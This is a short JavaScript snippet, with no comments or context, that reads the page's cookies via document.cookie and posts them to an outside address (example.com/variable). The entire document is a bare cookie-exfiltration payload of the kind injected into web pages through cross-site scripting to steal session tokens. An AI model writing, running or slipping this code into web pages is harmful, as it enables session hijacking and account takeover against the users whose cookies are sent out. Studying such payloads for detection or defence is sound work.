const cookieData = document.cookie;

const destination = "https://example.com/variable";

fetch(destination, {
    method: "POST",
    body: cookieData
});
